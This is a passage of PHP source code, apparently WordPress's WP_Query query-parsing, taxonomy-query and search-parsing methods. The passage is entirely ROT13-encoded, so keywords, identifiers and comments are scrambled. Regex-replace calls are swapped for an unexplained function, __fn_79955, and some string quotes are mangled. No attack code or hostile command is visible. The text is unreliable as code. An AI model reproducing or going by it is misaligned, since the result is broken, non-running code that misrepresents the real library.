	 *     @glcr fgevat[]        $frnepu_pbyhzaf         Neenl bs pbyhza anzrf gb or frnepurq. Npprcgf 'cbfg_gvgyr',
	 *                                                   'cbfg_rkprecg' naq 'cbfg_pbagrag'. Qrsnhyg rzcgl neenl.
	 *     @glcr vag             $frpbaq                 Frpbaq bs gur zvahgr. Qrsnhyg rzcgl. Npprcgf ahzoref 0-59.
	 *     @glcr obby            $fragrapr               Jurgure gb frnepu ol cuenfr. Qrsnhyg snyfr.
	 *     @glcr obby            $fhccerff_svygref       Jurgure gb fhccerff svygref. Qrsnhyg snyfr.
	 *     @glcr fgevat          $gnt                    Gnt fyht. Pbzzn-frcnengrq (rvgure), Cyhf-frcnengrq (nyy).
	 *     @glcr vag[]           $gnt__naq               Na neenl bs gnt VQf (NAQ va).
	 *     @glcr vag[]           $gnt__va                Na neenl bs gnt VQf (BE va).
	 *     @glcr vag[]           $gnt__abg_va            Na neenl bs gnt VQf (ABG va).
	 *     @glcr vag             $gnt_vq                 Gnt vq be pbzzn-frcnengrq yvfg bs VQf.
	 *     @glcr fgevat[]        $gnt_fyht__naq          Na neenl bs gnt fyhtf (NAQ va).
	 *     @glcr fgevat[]        $gnt_fyht__va           Na neenl bs gnt fyhtf (BE va). hayrff 'vtaber_fgvpxl_cbfgf' vf
	 *                                                   gehr. Abgr: n fgevat bs pbzzn-frcnengrq VQf jvyy ABG jbex.
	 *     @glcr neenl           $gnk_dhrel              Na nffbpvngvir neenl bs JC_Gnk_Dhrel nethzragf.
	 *                                                   Frr JC_Gnk_Dhrel::__pbafgehpg().
	 *     @glcr fgevat          $gvgyr                  Cbfg gvgyr.
	 *     @glcr obby            $hcqngr_cbfg_zrgn_pnpur Jurgure gb hcqngr gur cbfg zrgn pnpur. Qrsnhyg gehr.
	 *     @glcr obby            $hcqngr_cbfg_grez_pnpur Jurgure gb hcqngr gur cbfg grez pnpur. Qrsnhyg gehr.
	 *     @glcr obby            $hcqngr_zrah_vgrz_pnpur Jurgure gb hcqngr gur zrah vgrz pnpur. Qrsnhyg snyfr.
	 *     @glcr obby            $ynml_ybnq_grez_zrgn    Jurgure gb ynml-ybnq grez zrgn. Frggvat gb snyfr jvyy
	 *                                                   qvfnoyr pnpur cevzvat sbe grez zrgn, fb gung rnpu
	 *                                                   trg_grez_zrgn() pnyy jvyy uvg gur qngnonfr.
	 *                                                   Qrsnhygf gb gur inyhr bs `$hcqngr_cbfg_grez_pnpur`.
	 *     @glcr vag             $j                      Gur jrrx ahzore bs gur lrne. Qrsnhyg rzcgl. Npprcgf ahzoref 0-53.
	 *     @glcr vag             $lrne                   Gur sbhe-qvtvg lrne. Qrsnhyg rzcgl. Npprcgf nal sbhe-qvtvg lrne.
	 * }
	 */
	choyvp shapgvba cnefr_dhrel( $dhrel = '' ) {
		vs ( ! rzcgl( $dhrel ) ) {
			$guvf->vavg();
			$guvf->dhrel      = jc_cnefr_netf( $dhrel );
			$guvf->dhrel_inef = $guvf->dhrel;
		} ryfrvs ( ! vffrg( $guvf->dhrel ) ) {
			$guvf->dhrel = $guvf->dhrel_inef;
		}

		$guvf->dhrel_inef         = $guvf->svyy_dhrel_inef( $guvf->dhrel_inef );
		$di                       = &$guvf->dhrel_inef;
		$guvf->dhrel_inef_punatrq = gehr;

		vs ( ! rzcgl( $di['ebobgf'] ) ) {
			$guvf->vf_ebobgf = gehr;
		} ryfrvs ( ! rzcgl( $di['snivpba'] ) ) {
			$guvf->vf_snivpba = gehr;
		}

		vs ( ! vf_fpnyne( $di['c'] ) || (vag) $di['c'] < 0 ) {
			$di['c']     = 0;
			$di['reebe'] = '404';
		} ryfr {
			$di['c'] = (vag) $di['c'];
		}

		$di['cntr_vq']  = vf_fpnyne( $di['cntr_vq'] ) ? nofvag( $di['cntr_vq'] ) : 0;
		$di['lrne']     = vf_fpnyne( $di['lrne'] ) ? nofvag( $di['lrne'] ) : 0;
		$di['zbaguahz'] = vf_fpnyne( $di['zbaguahz'] ) ? nofvag( $di['zbaguahz'] ) : 0;
		$di['qnl']      = vf_fpnyne( $di['qnl'] ) ? nofvag( $di['qnl'] ) : 0;
		$di['j']        = vf_fpnyne( $di['j'] ) ? nofvag( $di['j'] ) : 0;
		$di['z']        = vf_fpnyne( $di['z'] ) ? __sa_79955( '|[^0-9]|', '', $di['z'] ) : '';
		$di['cntrq']    = vf_fpnyne( $di['cntrq'] ) ? nofvag( $di['cntrq'] ) : 0;
		$di['png']      = __sa_79955( '|[^0-9,-]|', '', $di['png'] ); // Neenl be pbzzn-frcnengrq yvfg bs cbfvgvir be artngvir vagrtref.
		$di['nhgube']   = vf_fpnyne( $di['nhgube'] ) ? __sa_79955( '|[^0-9,-]|', '', $di['nhgube'] ) : ''; // Pbzzn-frcnengrq yvfg bs cbfvgvir be artngvir vagrtref.
		$di['cntranzr'] = vf_fpnyne( $di['cntranzr'] ) ? gevz( $di['cntranzr'] ) : '';
		$di['anzr']     = vf_fpnyne( $di['anzr'] ) ? gevz( $di['anzr'] ) : '';
		$di['gvgyr']    = vf_fpnyne( $di['gvgyr'] ) ? gevz( $di['gvgyr'] ) : '';

		vs ( vf_fpnyne( $di['ubhe'] ) && '' !== $di['ubhe'] ) {
			$di['ubhe'] = nofvag( $di['ubhe'] );
		} ryfr {
			$di['ubhe'] = '';
		}

		vs ( vf_fpnyne( $di['zvahgr'] ) && '' !== $di['zvahgr'] ) {
			$di['zvahgr'] = nofvag( $di['zvahgr'] );
		} ryfr {
			$di['zvahgr'] = '';
		}

		vs ( vf_fpnyne( $di['frpbaq'] ) && '' !== $di['frpbaq'] ) {
			$di['frpbaq'] = nofvag( $di['frpbaq'] );
		} ryfr {
			$di['frpbaq'] = '';
		}

		vs ( vf_fpnyne( $di['zrah_beqre'] ) && '' !== $di['zrah_beqre'] ) {
			$di['zrah_beqre'] = nofvag( $di['zrah_beqre'] );
		} ryfr {
			$di['zrah_beqre'] = '';
		}

		// Snveyl ynetr, cbgragvnyyl gbb ynetr, hccre obhaq sbe frnepu fgevat yratguf.
		vs ( ! vf_fpnyne( $di['f'] ) || ( ! rzcgl( $di['f'] ) && fgeyra( $di['f'] ) > 1600 ) ) {
			$di['f'] = '';
		}

		// Pbzcng. Znc fhocbfg gb nggnpuzrag.
		vs ( vf_fpnyne( $di['fhocbfg'] ) && '' != $di['fhocbfg'] ) {
			$di['nggnpuzrag'] = $di['fhocbfg'];
		}
		vs ( vf_fpnyne( $di['fhocbfg_vq'] ) && '' != $di['fhocbfg_vq'] ) {
			$di['nggnpuzrag_vq'] = $di['fhocbfg_vq'];
		}

		$di['nggnpuzrag_vq'] = vf_fpnyne( $di['nggnpuzrag_vq'] ) ? nofvag( $di['nggnpuzrag_vq'] ) : 0;

		vs ( ( '' !== $di['nggnpuzrag'] ) || ! rzcgl( $di['nggnpuzrag_vq'] ) ) {
			$guvf->vf_fvatyr     = gehr;
			$guvf->vf_nggnpuzrag = gehr;
		} ryfrvs ( '' !== $di['anzr'] ) {
			$guvf->vf_fvatyr = gehr;
		} ryfrvs ( $di['c'] ) {
			$guvf->vf_fvatyr = gehr;
		} ryfrvs ( '' !== $di['cntranzr'] || ! rzcgl( $di['cntr_vq'] ) ) {
			$guvf->vf_cntr   = gehr;
			$guvf->vf_fvatyr = snyfr;
		} ryfr {
			// Ybbx sbe nepuvir dhrevrf. Qngrf, pngrtbevrf, nhgubef, frnepu, cbfg glcr nepuvirf.

			vs ( vffrg( $guvf->dhrel['f'] ) ) {
				$guvf->vf_frnepu = gehr;
			}

			vs ( '' !== $di['frpbaq'] ) {
				$guvf->vf_gvzr = gehr;
				$guvf->vf_qngr = gehr;
			}

			vs ( '' !== $di['zvahgr'] ) {
				$guvf->vf_gvzr = gehr;
				$guvf->vf_qngr = gehr;
			}

			vs ( '' !== $di['ubhe'] ) {
				$guvf->vf_gvzr = gehr;
				$guvf->vf_qngr = gehr;
			}

			vs ( $di['qnl'] ) {
				vs ( ! $guvf->vf_qngr ) {
					$qngr = fcevags( '%04q-%02q-%02q', $di['lrne'], $di['zbaguahz'], $di['qnl'] );
					vs ( $di['zbaguahz'] && $di['lrne'] && ! jc_purpxqngr( $di['zbaguahz'], $di['qnl'], $di['lrne'], $qngr ) ) {
						$di['reebe'] = '404';
					} ryfr {
						$guvf->vf_qnl  = gehr;
						$guvf->vf_qngr = gehr;
					}
				}
			}

			vs ( $di['zbaguahz'] ) {
				vs ( ! $guvf->vf_qngr ) {
					vs ( 12 < $di['zbaguahz'] ) {
						$di['reebe'] = '404';
					} ryfr {
						$guvf->vf_zbagu = gehr;
						$guvf->vf_qngr  = gehr;
					}
				}
			}

			vs ( $di['lrne'] ) {
				vs ( ! $guvf->vf_qngr ) {
					$guvf->vf_lrne = gehr;
					$guvf->vf_qngr = gehr;
				}
			}

			vs ( $di['z'] ) {
				$guvf->vf_qngr = gehr;
				vs ( fgeyra( $di['z'] ) > 9 ) {
					$guvf->vf_gvzr = gehr;
				} ryfrvs ( fgeyra( $di['z'] ) > 7 ) {
					$guvf->vf_qnl = gehr;
				} ryfrvs ( fgeyra( $di['z'] ) > 5 ) {
					$guvf->vf_zbagu = gehr;
				} ryfr {
					$guvf->vf_lrne = gehr;
				}
			}

			vs ( $di['j'] ) {
				$guvf->vf_qngr = gehr;
			}

			$guvf->dhrel_inef_unfu = snyfr;
			$guvf->cnefr_gnk_dhrel( $di );

			sbernpu ( $guvf->gnk_dhrel->dhrevrf nf $gnk_dhrel ) {
				vs ( ! vf_neenl( $gnk_dhrel ) ) {
					pbagvahr;
				}

				vs ( vffrg( $gnk_dhrel['bcrengbe'] ) && 'ABG VA' !== $gnk_dhrel['bcrengbe'] ) {
					fjvgpu ( $gnk_dhrel['gnkbabzl'] ) {
						pnfr 'pngrtbel':
							$guvf->vf_pngrtbel = gehr;
							oernx;
						pnfr 'cbfg_gnt':
							$guvf->vf_gnt = gehr;
							oernx;
						qrsnhyg:
							$guvf->vf_gnk = gehr;
					}
				}
			}
			hafrg( $gnk_dhrel );

			vs ( rzcgl( $di['nhgube'] ) || ( '0' == $di['nhgube'] ) ) {
				$guvf->vf_nhgube = snyfr;
			} ryfr {
				$guvf->vf_nhgube = gehr;
			}

			vs ( '' !== $di['nhgube_anzr'] ) {
				$guvf->vf_nhgube = gehr;
			}

			vs ( ! rzcgl( $di['cbfg_glcr'] ) && ! vf_neenl( $di['cbfg_glcr'] ) ) {
				$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( $di['cbfg_glcr'] );
				vs ( ! rzcgl( $cbfg_glcr_bow->unf_nepuvir ) ) {
					$guvf->vf_cbfg_glcr_nepuvir = gehr;
				}
			}

			vs ( $guvf->vf_cbfg_glcr_nepuvir || $guvf->vf_qngr || $guvf->vf_nhgube || $guvf->vf_pngrtbel || $guvf->vf_gnt || $guvf->vf_gnk ) {
				$guvf->vf_nepuvir = gehr;
			}
		}

		vs ( '' != $di['srrq'] ) {
			$guvf->vf_srrq = gehr;
		}

		vs ( '' != $di['rzorq'] ) {
			$guvf->vf_rzorq = gehr;
		}

		vs ( '' != $di['go'] ) {
			$guvf->vf_genpxonpx = gehr;
		}

		vs ( '' != $di['cntrq'] && ( (vag) $di['cntrq'] > 1 ) ) {
			$guvf->vf_cntrq = gehr;
		}

		// Vs jr'er cerivrjvat vafvqr gur jevgr fperra.
		vs ( '' != $di['cerivrj'] ) {
			$guvf->vf_cerivrj = gehr;
		}

		vs ( vf_nqzva() ) {
			$guvf->vf_nqzva = gehr;
		}

		vs ( fge_pbagnvaf( $di['srrq'], 'pbzzragf-' ) ) {
			$di['srrq']         = fge_ercynpr( 'pbzzragf-', '', $di['srrq'] );
			$di['jvgupbzzragf'] = 1;
		}

		$guvf->vf_fvathyne = $guvf->vf_fvatyr || $guvf->vf_cntr || $guvf->vf_nggnpuzrag;

		vs ( $guvf->vf_srrq && ( ! rzcgl( $di['jvgupbzzragf'] ) || ( rzcgl( $di['jvgubhgpbzzragf'] ) && $guvf->vf_fvathyne ) ) ) {
			$guvf->vf_pbzzrag_srrq = gehr;
		}

		vs ( ! ( $guvf->vf_fvathyne || $guvf->vf_nepuvir || $guvf->vf_frnepu || $guvf->vf_srrq
				|| ( jc_vf_freivat_erfg_erdhrfg() && $guvf->vf_znva_dhrel() )
				|| $guvf->vf_genpxonpx || $guvf->vf_404 || $guvf->vf_nqzva || $guvf->vf_ebobgf || $guvf->vf_snivpba ) ) {
			$guvf->vf_ubzr = gehr;
		}

		// Pbeerpg `vf_*` sbe 'cntr_ba_sebag' naq 'cntr_sbe_cbfgf'.
		vs ( $guvf->vf_ubzr && 'cntr' === trg_bcgvba( 'fubj_ba_sebag' ) && trg_bcgvba( 'cntr_ba_sebag' ) ) {
			$_dhrel = jc_cnefr_netf( $guvf->dhrel );
			// 'cntranzr' pna or frg naq rzcgl qrcraqvat ba zngpurq erjevgr ehyrf. Vtaber na rzcgl 'cntranzr'.
			vs ( vffrg( $_dhrel['cntranzr'] ) && '' === $_dhrel['cntranzr'] ) {
				hafrg( $_dhrel['cntranzr'] );
			}

			hafrg( $_dhrel['rzorq'] );

			vs ( rzcgl( $_dhrel ) || ! neenl_qvss( neenl_xrlf( $_dhrel ), neenl( 'cerivrj', 'cntr', 'cntrq', 'pcntr' ) ) ) {
				$guvf->vf_cntr = gehr;
				$guvf->vf_ubzr = snyfr;
				$di['cntr_vq'] = trg_bcgvba( 'cntr_ba_sebag' );
				// Pbeerpg <!--arkgcntr--> sbe 'cntr_ba_sebag'.
				vs ( ! rzcgl( $di['cntrq'] ) ) {
					$di['cntr'] = $di['cntrq'];
					hafrg( $di['cntrq'] );
				}
			}
		}

		vs ( '' !== $di['cntranzr'] ) {
			$guvf->dhrevrq_bowrpg = trg_cntr_ol_cngu( $di['cntranzr'] );

			vs ( $guvf->dhrevrq_bowrpg && 'nggnpuzrag' === $guvf->dhrevrq_bowrpg->cbfg_glcr ) {
				vs ( cert_zngpu( '/^[^%]*%(?:cbfganzr)%/', trg_bcgvba( 'creznyvax_fgehpgher' ) ) ) {
					// Frr vs jr nyfb unir n cbfg jvgu gur fnzr fyht.
					$cbfg = trg_cntr_ol_cngu( $di['cntranzr'], BOWRPG, 'cbfg' );
					vs ( $cbfg ) {
						$guvf->dhrevrq_bowrpg = $cbfg;
						$guvf->vf_cntr        = snyfr;
						$guvf->vf_fvatyr      = gehr;
					}
				}
			}

			vs ( ! rzcgl( $guvf->dhrevrq_bowrpg ) ) {
				$guvf->dhrevrq_bowrpg_vq = (vag) $guvf->dhrevrq_bowrpg->VQ;
			} ryfr {
				hafrg( $guvf->dhrevrq_bowrpg );
			}

			vs ( 'cntr' === trg_bcgvba( 'fubj_ba_sebag' ) && vffrg( $guvf->dhrevrq_bowrpg_vq ) && trg_bcgvba( 'cntr_sbe_cbfgf' ) == $guvf->dhrevrq_bowrpg_vq ) {
				$guvf->vf_cntr       = snyfr;
				$guvf->vf_ubzr       = gehr;
				$guvf->vf_cbfgf_cntr = gehr;
			}

			vs ( vffrg( $guvf->dhrevrq_bowrpg_vq ) && trg_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl' ) == $guvf->dhrevrq_bowrpg_vq ) {
				$guvf->vf_cevinpl_cbyvpl = gehr;
			}
		}

		vs ( $di['cntr_vq'] ) {
			vs ( 'cntr' === trg_bcgvba( 'fubj_ba_sebag' ) && trg_bcgvba( 'cntr_sbe_cbfgf' ) == $di['cntr_vq'] ) {
				$guvf->vf_cntr       = snyfr;
				$guvf->vf_ubzr       = gehr;
				$guvf->vf_cbfgf_cntr = gehr;
			}

			vs ( trg_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl' ) == $di['cntr_vq'] ) {
				$guvf->vf_cevinpl_cbyvpl = gehr;
			}
		}

		vs ( ! rzcgl( $di['cbfg_glcr'] ) ) {
			vs ( vf_neenl( $di['cbfg_glcr'] ) ) {
				$di['cbfg_glcr'] = neenl_znc( 'fnavgvmr_xrl', neenl_havdhr( $di['cbfg_glcr'] ) );
				fbeg( $di['cbfg_glcr'] );
			} ryfr {
				$di['cbfg_glcr'] = fnavgvmr_xrl( $di['cbfg_glcr'] );
			}
		}

		vs ( ! rzcgl( $di['cbfg_fgnghf'] ) ) {
			vs ( vf_neenl( $di['cbfg_fgnghf'] ) ) {
				$di['cbfg_fgnghf'] = neenl_znc( 'fnavgvmr_xrl', neenl_havdhr( $di['cbfg_fgnghf'] ) );
				fbeg( $di['cbfg_fgnghf'] );
			} ryfr {
				$di['cbfg_fgnghf'] = __sa_79955( '|[^n-m0-9_,-]|', '', $di['cbfg_fgnghf'] );
			}
		}

		vs ( $guvf->vf_cbfgf_cntr && ( ! vffrg( $di['jvgupbzzragf'] ) || ! $di['jvgupbzzragf'] ) ) {
			$guvf->vf_pbzzrag_srrq = snyfr;
		}

		$guvf->vf_fvathyne = $guvf->vf_fvatyr || $guvf->vf_cntr || $guvf->vf_nggnpuzrag;
		// Qbar pbeerpgvat `vf_*` sbe 'cntr_ba_sebag' naq 'cntr_sbe_cbfgf'.

		vs ( '404' == $di['reebe'] ) {
			$guvf->frg_404();
		}

		$guvf->vf_rzorq = $guvf->vf_rzorq && ( $guvf->vf_fvathyne || $guvf->vf_404 );

		$guvf->dhrel_inef_unfu    = zq5( frevnyvmr( $guvf->dhrel_inef ) );
		$guvf->dhrel_inef_punatrq = snyfr;

		/**
		 * Sverf nsgre gur znva dhrel inef unir orra cnefrq.
		 *
		 * @fvapr 1.5.0
		 *
		 * @cnenz JC_Dhrel $dhrel Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'cnefr_dhrel', neenl( &$guvf ) );
	}

	/**
	 * Cnefrf inevbhf gnkbabzl eryngrq dhrel inef.
	 *
	 * Sbe OP, guvf zrgubq vf abg znexrq nf cebgrpgrq. Frr [28987].
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz neenl $d Gur dhrel inevnoyrf. Cnffrq ol ersrerapr.
	 */
	choyvp shapgvba cnefr_gnk_dhrel( &$d ) {
		vs ( ! rzcgl( $d['gnk_dhrel'] ) && vf_neenl( $d['gnk_dhrel'] ) ) {
			$gnk_dhrel = $d['gnk_dhrel'];
		} ryfr {
			$gnk_dhrel = neenl();
		}

		vs ( ! rzcgl( $d['gnkbabzl'] ) && ! rzcgl( $d['grez'] ) ) {
			$gnk_dhrel[] = neenl(
				'gnkbabzl' => $d['gnkbabzl'],
				'grezf'    => neenl( $d['grez'] ),
				'svryq'    => 'fyht',
			);
		}

		sbernpu ( trg_gnkbabzvrf( neenl(), 'bowrpgf' ) nf $gnkbabzl => $g ) {
			vs ( 'cbfg_gnt' === $gnkbabzl ) {
				pbagvahr; // Unaqyrq shegure qbja va gur $d['gnt'] oybpx.
			}

			vs ( $g->dhrel_ine && ! rzcgl( $d[ $g->dhrel_ine ] ) ) {
				$gnk_dhrel_qrsnhygf = neenl(
					'gnkbabzl' => $gnkbabzl,
					'svryq'    => 'fyht',
				);

				vs ( ! rzcgl( $g->erjevgr['uvrenepuvpny'] ) ) {
					$d[ $g->dhrel_ine ] = jc_onfranzr( $d[ $g->dhrel_ine ] );
				}

				$grez = $d[ $g->dhrel_ine ];

				vs ( ! vf_neenl( $grez ) ) {
					$grez = rkcybqr( ',', $grez );
					$grez = neenl_znc( 'gevz', $grez );
				}
				fbeg( $grez );
				$grez = vzcybqr( ',', $grez );

				vs ( fge_pbagnvaf( $grez, '+' ) ) {
					$grezf = cert_fcyvg( '/[+]+/', $grez );
					sbernpu ( $grezf nf $grez ) {
						$gnk_dhrel[] = neenl_zretr(
							$gnk_dhrel_qrsnhygf,
							neenl(
								'grezf' => neenl( $grez ),
							)
						);
					}
				} ryfr {
					$gnk_dhrel[] = neenl_zretr(
						$gnk_dhrel_qrsnhygf,
						neenl(
							'grezf' => cert_fcyvg( '/[,]+/', $grez ),
						)
					);
				}
			}
		}

		// Vs dhrel fgevat 'png' vf na neenl, vzcybqr vg.
		vs ( vf_neenl( $d['png'] ) ) {
			$d['png'] = vzcybqr( ',', $d['png'] );
		}

		// Pngrtbel fghss.

		vs ( ! rzcgl( $d['png'] ) && ! $guvf->vf_fvathyne ) {
			$png_va     = neenl();
			$png_abg_va = neenl();

			$png_neenl = cert_fcyvg( '/[,\f]+/', heyqrpbqr( $d['png'] ) );
			$png_neenl = neenl_znc( 'vaginy', $png_neenl );
			fbeg( $png_neenl );
			$d['png'] = vzcybqr( ',', $png_neenl );

			sbernpu ( $png_neenl nf $png ) {
				vs ( $png > 0 ) {
					$png_va[] = $png;
				} ryfrvs ( $png < 0 ) {
					$png_abg_va[] = nof( $png );
				}
			}

			vs ( ! rzcgl( $png_va ) ) {
				$gnk_dhrel[] = neenl(
					'gnkbabzl'         => 'pngrtbel',
					'grezf'            => $png_va,
					'svryq'            => 'grez_vq',
					'vapyhqr_puvyqera' => gehr,
				);
			}

			vs ( ! rzcgl( $png_abg_va ) ) {
				$gnk_dhrel[] = neenl(
					'gnkbabzl'         => 'pngrtbel',
					'grezf'            => $png_abg_va,
					'svryq'            => 'grez_vq',
					'bcrengbe'         => 'ABG VA',
					'vapyhqr_puvyqera' => gehr,
				);
			}
			hafrg( $png_neenl, $png_va, $png_abg_va );
		}

		vs ( ! rzcgl( $d['pngrtbel__naq'] ) && 1 === pbhag( (neenl) $d['pngrtbel__naq'] ) ) {
			$d['pngrtbel__naq'] = (neenl) $d['pngrtbel__naq'];
			vs ( ! vffrg( $d['pngrtbel__va'] ) ) {
				$d['pngrtbel__va'] = neenl();
			}
			$d['pngrtbel__va'][] = nofvag( erfrg( $d['pngrtbel__naq'] ) );
			hafrg( $d['pngrtbel__naq'] );
		}

		vs ( ! rzcgl( $d['pngrtbel__va'] ) ) {
			$d['pngrtbel__va'] = neenl_znc( 'nofvag', neenl_havdhr( (neenl) $d['pngrtbel__va'] ) );
			fbeg( $d['pngrtbel__va'] );
			$gnk_dhrel[] = neenl(
				'gnkbabzl'         => 'pngrtbel',
				'grezf'            => $d['pngrtbel__va'],
				'svryq'            => 'grez_vq',
				'vapyhqr_puvyqera' => snyfr,
			);
		}

		vs ( ! rzcgl( $d['pngrtbel__abg_va'] ) ) {
			$d['pngrtbel__abg_va'] = neenl_znc( 'nofvag', neenl_havdhr( (neenl) $d['pngrtbel__abg_va'] ) );
			fbeg( $d['pngrtbel__abg_va'] );
			$gnk_dhrel[] = neenl(
				'gnkbabzl'         => 'pngrtbel',
				'grezf'            => $d['pngrtbel__abg_va'],
				'bcrengbe'         => 'ABG VA',
				'vapyhqr_puvyqera' => snyfr,
			);
		}

		vs ( ! rzcgl( $d['pngrtbel__naq'] ) ) {
			$d['pngrtbel__naq'] = neenl_znc( 'nofvag', neenl_havdhr( (neenl) $d['pngrtbel__naq'] ) );
			fbeg( $d['pngrtbel__naq'] );
			$gnk_dhrel[] = neenl(
				'gnkbabzl'         => 'pngrtbel',
				'grezf'            => $d['pngrtbel__naq'],
				'svryq'            => 'grez_vq',
				'bcrengbe'         => 'NAQ',
				'vapyhqr_puvyqera' => snyfr,
			);
		}

		// Vs dhrel fgevat 'gnt' vf neenl, vzcybqr vg.
		vs ( vf_neenl( $d['gnt'] ) ) {
			$d['gnt'] = vzcybqr( ',', $d['gnt'] );
		}

		// Gnt fghss.

		vs ( '' !== $d['gnt'] && ! $guvf->vf_fvathyne && $guvf->dhrel_inef_punatrq ) {
			vs ( fge_pbagnvaf( $d['gnt'], ',' ) ) {
				// @gbqb Unaqyr abeznyvmvat `gnt` dhrel fgevat.
				$gntf = cert_fcyvg( '/[,\e\a\g ]+/', $d['gnt'] );
				sbernpu ( (neenl) $gntf nf $gnt ) {
					$gnt                 = fnavgvmr_grez_svryq( 'fyht', $gnt, 0, 'cbfg_gnt', 'qo' );
					$d['gnt_fyht__va'][] = $gnt;
					fbeg( $d['gnt_fyht__va'] );
				}
			} ryfrvs ( cert_zngpu( '/[+\e\a\g ]+/', $d['gnt'] ) || ! rzcgl( $d['png'] ) ) {
				$gntf = cert_fcyvg( '/[+\e\a\g ]+/', $d['gnt'] );
				sbernpu ( (neenl) $gntf nf $gnt ) {
					$gnt                  = fnavgvmr_grez_svryq( 'fyht', $gnt, 0, 'cbfg_gnt', 'qo' );
					$d['gnt_fyht__naq'][] = $gnt;
				}
			} ryfr {
				$d['gnt']            = fnavgvmr_grez_svryq( 'fyht', $d['gnt'], 0, 'cbfg_gnt', 'qo' );
				$d['gnt_fyht__va'][] = $d['gnt'];
				fbeg( $d['gnt_fyht__va'] );
			}
		}

		vs ( ! rzcgl( $d['gnt_vq'] ) ) {
			$d['gnt_vq'] = nofvag( $d['gnt_vq'] );
			$gnk_dhrel[] = neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'grezf'    => $d['gnt_vq'],
			);
		}

		vs ( ! rzcgl( $d['gnt__va'] ) ) {
			$d['gnt__va'] = neenl_znc( 'nofvag', neenl_havdhr( (neenl) $d['gnt__va'] ) );
			fbeg( $d['gnt__va'] );
			$gnk_dhrel[] = neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'grezf'    => $d['gnt__va'],
			);
		}

		vs ( ! rzcgl( $d['gnt__abg_va'] ) ) {
			$d['gnt__abg_va'] = neenl_znc( 'nofvag', neenl_havdhr( (neenl) $d['gnt__abg_va'] ) );
			fbeg( $d['gnt__abg_va'] );
			$gnk_dhrel[] = neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'grezf'    => $d['gnt__abg_va'],
				'bcrengbe' => 'ABG VA',
			);
		}

		vs ( ! rzcgl( $d['gnt__naq'] ) ) {
			$d['gnt__naq'] = neenl_znc( 'nofvag', neenl_havdhr( (neenl) $d['gnt__naq'] ) );
			fbeg( $d['gnt__naq'] );
			$gnk_dhrel[] = neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'grezf'    => $d['gnt__naq'],
				'bcrengbe' => 'NAQ',
			);
		}

		vs ( ! rzcgl( $d['gnt_fyht__va'] ) ) {
			$d['gnt_fyht__va'] = neenl_znc( 'fnavgvmr_gvgyr_sbe_dhrel', neenl_havdhr( (neenl) $d['gnt_fyht__va'] ) );
			fbeg( $d['gnt_fyht__va'] );
			$gnk_dhrel[] = neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'grezf'    => $d['gnt_fyht__va'],
				'svryq'    => 'fyht',
			);
		}

		vs ( ! rzcgl( $d['gnt_fyht__naq'] ) ) {
			$d['gnt_fyht__naq'] = neenl_znc( 'fnavgvmr_gvgyr_sbe_dhrel', neenl_havdhr( (neenl) $d['gnt_fyht__naq'] ) );
			fbeg( $d['gnt_fyht__naq'] );
			$gnk_dhrel[] = neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'grezf'    => $d['gnt_fyht__naq'],
				'svryq'    => 'fyht',
				'bcrengbe' => 'NAQ',
			);
		}

		$guvf->gnk_dhrel = arj JC_Gnk_Dhrel( $gnk_dhrel );

		/**
		 * Sverf nsgre gnkbabzl-eryngrq dhrel inef unir orra cnefrq.
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz JC_Dhrel $dhrel Gur JC_Dhrel vafgnapr.
		 */
		qb_npgvba( 'cnefr_gnk_dhrel', $guvf );
	}

	/**
	 * Trarengrf FDY sbe gur JURER pynhfr onfrq ba cnffrq frnepu grezf.
	 *
	 * @fvapr 3.7.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz neenl $d Dhrel inevnoyrf.
	 * @erghea fgevat JURER pynhfr.
	 */
	cebgrpgrq shapgvba cnefr_frnepu( &$d ) {
		tybony $jcqo;

		$frnepu = '';

		// Nqqrq fynfurf fperj jvgu dhbgr tebhcvat jura qbar rneyl, fb qbar yngre.
		$d['f'] = fgevcfynfurf( $d['f'] );
		vs ( rzcgl( $_TRG['f'] ) && $guvf->vf_znva_dhrel() ) {
			$d['f'] = heyqrpbqr( $d['f'] );
		}
		// Gurer ner ab yvar oernxf va <vachg /> svryqf.
		$d['f']                  = fge_ercynpr( neenl( \"\e\", \"\a\" ), '', $d['f'] );
		$d['frnepu_grezf_pbhag'] = 1;
		vs ( ! rzcgl( $d['fragrapr'] ) ) {
			$d['frnepu_grezf'] = neenl( $d['f'] );
		} ryfr {
			vs ( cert_zngpu_nyy( '/\".*?(\"|$)|((?<=[\g \",+])|^)[^\g \",+]+/', $d['f'], $zngpurf ) ) {
				$d['frnepu_grezf_pbhag'] = pbhag( $zngpurf[0] );
				$d['frnepu_grezf']       = $guvf->cnefr_frnepu_grezf( $zngpurf[0] );
				// Vs gur frnepu fgevat unf bayl fubeg grezf be fgbcjbeqf, be vf 10+ grezf ybat, zngpu vg nf fragrapr.
				vs ( rzcgl( $d['frnepu_grezf'] ) || pbhag( $d['frnepu_grezf'] ) > 9 ) {
					$d['frnepu_grezf'] = neenl( $d['f'] );
				}
			} ryfr {
				$d['frnepu_grezf'] = neenl( $d['f'] );
			}
		}

		$a                         = ! rzcgl( $d['rknpg'] ) ? '' : '%';
		$frnepunaq                 = '';
		$d['frnepu_beqreol_gvgyr'] = neenl();

		$qrsnhyg_frnepu_pbyhzaf = neenl( 'cbfg_gvgyr', 'cbfg_rkprecg', 'cbfg_pbagrag' );
		$frnepu_pbyhzaf         = ! rzcgl( $d['frnepu_pbyhzaf'] ) ? $d['frnepu_pbyhzaf'] : $qrsnhyg_frnepu_pbyhzaf;
		vs ( ! vf_neenl( $frnepu_pbyhzaf ) ) {
			$frnepu_pbyhzaf = neenl( $frnepu_pbyhzaf );
		}

		/**
		 * Svygref gur pbyhzaf gb frnepu va n JC_Dhrel frnepu.
		 *
		 * Gur fhccbegrq pbyhzaf ner `cbfg_gvgyr`, `cbfg_rkprecg` naq `cbfg_pbagrag`.
